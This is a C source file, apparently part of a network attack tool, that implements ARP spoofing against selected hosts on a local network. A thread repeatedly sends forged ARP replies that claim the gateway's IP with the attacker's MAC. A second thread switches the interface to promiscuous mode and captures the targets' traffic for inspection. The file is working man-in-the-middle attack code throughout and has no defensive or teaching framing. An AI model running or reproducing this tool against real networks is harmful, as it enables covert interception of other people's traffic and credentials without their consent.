#include "arp.h"
#include "protocol.h"

unsigned char attacker_mac[MAC_LEN];
unsigned char spoof_ip[4];
char iface_name[IFNAMSIZ];
int ifindex;
target_info_t targets[MAX_TARGETS];
int target_count = 0;
int packet_counter = 0;
packet_callback_t packet_callback = NULL;

// Global shutdown flag for clean thread termination
static volatile int should_shutdown = 0;

int parse_mac(const char *mac_str, unsigned char *mac_bytes) {
    return sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac_bytes[0], &mac_bytes[1], &mac_bytes[2],
                  &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6;
}

void get_attacker_mac(const char *iface, unsigned char *mac) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, iface);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, MAC_LEN);
}

void str_to_ip(const char *ip_str, unsigned char *ip_bytes) {
    inet_pton(AF_INET, ip_str, ip_bytes);
}

void get_interface_index(const char *iface, int *index) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1) {
        perror("SIOCGIFINDEX");
        exit(EXIT_FAILURE);
    }
    *index = ifr.ifr_ifindex;
    close(fd);
}

void setup_targets(scan_result_t *scan_result, int *target_indices, int count) {
    // Reset shutdown flag when setting up new targets
    should_shutdown = 0;
    
    // Validate count doesn't exceed MAX_TARGETS
    if (count > MAX_TARGETS) {
        printf("Warning: Limiting targets to %d (requested %d)\n", MAX_TARGETS, count);
        count = MAX_TARGETS;
    }
    
    target_count = count;
    
    // Find gateway IP for spoofing
    str_to_ip(scan_result->gateway_ip, spoof_ip);
    
    printf("\n[*] Setting up %d targets:\n", count);
    int valid_targets = 0;
    
    for (int i = 0; i < count; i++) {
        int idx = target_indices[i];
        if (idx >= 0 && idx < scan_result->count) {
            memcpy(targets[valid_targets].mac, scan_result->devices[idx].mac, MAC_LEN);
            str_to_ip(scan_result->devices[idx].ip, targets[valid_targets].ip);
            targets[valid_targets].active = 1;
            
            printf("Target %d: %s (%02x:%02x:%02x:%02x:%02x:%02x)\n", 
                   valid_targets + 1, scan_result->devices[idx].ip,
                   targets[valid_targets].mac[0], targets[valid_targets].mac[1], targets[valid_targets].mac[2],
                   targets[valid_targets].mac[3], targets[valid_targets].mac[4], targets[valid_targets].mac[5]);
            valid_targets++;
        } else {
            printf("Warning: Invalid target index %d, skipping\n", idx + 1);
        }
    }
    
    target_count = valid_targets;
    printf("Spoofing as: %s\n", scan_result->gateway_ip);
    printf("[*] Successfully configured %d valid targets\n", target_count);
}

void set_packet_callback(packet_callback_t callback) {
    packet_callback = callback;
    printf("[DEBUG] Packet callback %s\n", callback ? "SET" : "CLEARED");
}

void request_arp_shutdown(void) {
    should_shutdown = 1;
    printf("[DEBUG] ARP shutdown requested\n");
}

void *arp_spoof_thread(void *arg) {
    (void)arg; // Suppress unused parameter warning
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Socket");
        exit(1);
    }

    printf("[*] ARP spoofing thread started\n");
    
    // Dynamic interval based on target count for better performance
    int spoof_interval = (target_count > 50) ? 3000000 : 2000000; // 3s for 50+, 2s otherwise
    printf("[*] Using %d second spoofing interval for %d targets\n", spoof_interval/1000000, target_count);

    while (!should_shutdown) {  // Check shutdown flag
        int active_targets = 0;
        for (int t = 0; t < target_count; t++) {
            if (!targets[t].active || should_shutdown) break;  // Early exit on shutdown
            active_targets++;

            unsigned char packet[42];
            struct ether_header *eth = (struct ether_header *)packet;
            memcpy(eth->ether_shost, attacker_mac, MAC_LEN);
            memcpy(eth->ether_dhost, targets[t].mac, MAC_LEN);
            eth->ether_type = htons(ETH_P_ARP);

            struct ether_arp *arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
            arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
            arp->ea_hdr.ar_pro = htons(ETH_P_IP);
            arp->ea_hdr.ar_hln = MAC_LEN;
            arp->ea_hdr.ar_pln = 4;
            arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

            memcpy(arp->arp_sha, attacker_mac, MAC_LEN);
            memcpy(arp->arp_spa, spoof_ip, 4);
            memcpy(arp->arp_tha, targets[t].mac, MAC_LEN);
            memcpy(arp->arp_tpa, targets[t].ip, 4);

            struct sockaddr_ll sa;
            memset(&sa, 0, sizeof(sa));
            sa.sll_ifindex = ifindex;
            sa.sll_halen = MAC_LEN;
            memcpy(sa.sll_addr, targets[t].mac, MAC_LEN);

            if (sendto(sock, packet, 42, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
                perror("sendto");
            }
            
            // Small delay between packets to avoid overwhelming network
            if (target_count > 20) {
                usleep(10000); // 10ms delay for large target counts
            }
        }
        
        if (active_targets == 0 || should_shutdown) {
            printf("[*] ARP spoofing thread stopping (active_targets=%d, shutdown=%d)\n", active_targets, should_shutdown);
            break;  // Clean exit
        }
        
        // Use shorter sleep intervals to check shutdown flag more frequently
        for (int i = 0; i < spoof_interval/100000 && !should_shutdown; i++) {
            usleep(100000); // 100ms chunks instead of full interval
        }
    }

    close(sock);
    printf("[*] ARP spoofing thread exited cleanly\n");
    return NULL;
}

void *sniff_thread(void *arg) {
    (void)arg; // Suppress unused parameter warning
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("Sniff socket");
        exit(1);
    }

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    
    if (bind(sock, (struct sockaddr*)&sll, sizeof(sll)) == -1) {
        perror("bind");
        close(sock);
        exit(1);
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface_name, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFFLAGS, &ifr) == -1) {
        perror("SIOCGIFFLAGS");
        close(sock);
        exit(1);
    }

    ifr.ifr_flags |= IFF_PROMISC;

    if (ioctl(sock, SIOCSIFFLAGS, &ifr) == -1) {
        perror("SIOCSIFFLAGS");
        close(sock);
        exit(1);
    }

    // Set socket to non-blocking mode for responsive shutdown
    int flags = fcntl(sock, F_GETFL, 0);
    if (flags != -1) {
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    }

    printf("[*] Promiscuous mode enabled on %s\n", iface_name);
    printf("[*] Monitoring %d targets\n", target_count);

    unsigned char buffer[65536];
    int packet_count = 0;
    
    while (!should_shutdown) {
        int len = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
        
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(10000); // 10ms delay when no packets available
                continue;
            }
            // Real error occurred
            if (!should_shutdown) {
                perror("recvfrom error");
            }
            break;
        }
        
        if (len < 14) continue;

        struct ether_header *eth = (struct ether_header *)buffer;
        
        packet_count++;
        
        // Reduce debug frequency for large target counts to avoid spam
        int debug_interval = (target_count > 50) ? 2000 : 500;
        if (packet_count % debug_interval == 0) {
            printf("[DEBUG] Processed %d packets so far...\n", packet_count);
        }

        // Check if packet involves any of our targets (optimized for large target counts)
        int is_target_packet = 0;
        int target_index = -1;
        
        // Quick check: skip broadcast and multicast packets for efficiency
        if (eth->ether_dhost[0] & 0x01) {
            continue; // Skip multicast/broadcast packets
        }
        
        for (int t = 0; t < target_count; t++) {
            if (!targets[t].active) continue;
            
            int is_from_target = (memcmp(eth->ether_shost, targets[t].mac, MAC_LEN) == 0);
            int is_to_target = (memcmp(eth->ether_dhost, targets[t].mac, MAC_LEN) == 0);
            
            if (is_from_target || is_to_target) {
                is_target_packet = 1;
                target_index = t;
                break;
            }
        }
        
        // Skip our own ARP packets
        int is_from_attacker = (memcmp(eth->ether_shost, attacker_mac, MAC_LEN) == 0);
        if (is_from_attacker && ntohs(eth->ether_type) == ETH_P_ARP) {
            continue;
        }
        
        if (is_target_packet) {
            packet_counter++;
            
            // Use callback if available, otherwise print to terminal
            if (packet_callback) {
                printf("[DEBUG] Calling packet callback for target %d, size %d\n", target_index, len);
                packet_callback(buffer, len, target_index);
            } else {
                printf("[DEBUG] No callback set, printing to terminal\n");
                printf("\n[%d] Target %d packet captured:\n", packet_counter, target_index + 1);
                printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                       eth->ether_shost[0], eth->ether_shost[1], eth->ether_shost[2],
                       eth->ether_shost[3], eth->ether_shost[4], eth->ether_shost[5]);
                printf("Dest MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                       eth->ether_dhost[0], eth->ether_dhost[1], eth->ether_dhost[2],
                       eth->ether_dhost[3], eth->ether_dhost[4], eth->ether_dhost[5]);
                identify_protocol(buffer, len);
                printf("----------------------------------------\n");
            }
        }
    }

    close(sock);
    printf("[*] Sniff thread exited cleanly\n");
    return NULL;
}